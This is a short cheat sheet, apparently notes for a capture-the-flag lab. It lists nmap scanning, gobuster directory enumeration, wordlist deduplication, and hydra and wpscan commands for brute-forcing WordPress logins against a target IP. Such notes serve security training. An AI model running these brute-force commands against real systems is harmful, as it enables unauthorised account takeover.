### How to scan ports with nmap
```bash
IP_ADDR=
nmap -sV -sC -oA initial $IP_ADDR
```
### How to enumerate web server directories
```bash
WORDLISTS=
gobuster dir -u HTTP://${IP_ADDR} -w ${WORDLISTS} -t 100 -q -o gobuster.txt
```
## How to filter unique string
```bash
wc -l fsocity.dic # number of lines
sort fsocity.dic | uniq | wc -l # unique words
sort fsocity.dic | uniq > example_filtered.txt
```
### How to bruteforce input fields with hydra
Username
```bash
hydra -L fsocity.dic -p example $IP_ADDR http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
```
Password
```bash
hydra -L example -P fsocity.dic $IP_ADDR http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you enter for the username" -t 30
```
### How to bruteforce input fields with wpscan
```bash
wpscan --url http://${IP_ADDR} --passwords fsocity.dic --usernames Elliot  
```
